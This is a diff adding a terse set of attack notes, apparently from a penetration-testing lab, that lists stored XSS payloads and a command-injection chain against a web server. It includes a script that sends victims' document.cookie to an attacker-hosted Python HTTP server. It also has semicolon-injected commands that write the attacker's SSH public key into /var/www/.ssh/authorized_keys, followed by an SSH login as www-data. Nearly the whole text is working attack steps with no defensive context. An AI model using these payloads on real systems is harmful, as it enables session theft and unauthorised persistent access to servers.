@@ -1,0 +1,46 @@
+robots.txt 
+
+
+
+
+
+
+stored XSS
+<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+
+
+
+<script>alert('XSS');</script>
+
+
+python3 -m http.server
+
+url                                 lin ops IP
+<script>document.location="http://10.50.XX.XXX:8000/"+document.cookie;</script>
+
+
+
+ssh-keygen -t rsa -b 4096
+enter/y/enter/entter
+cat .ssh/id_rsa.pub
+
+;var/www/
+;mkdir .ssh
+
+; echo "<ENTIRE ID_RSA.PUB>" > /var/www/.ssh/authorized_keys
+
+                            web server exploited
+ssh -i .ssh/id_rsa www-data@10.50.XX.XXX
+
+
+
+
+
+
+
+
+
+
+
+
+
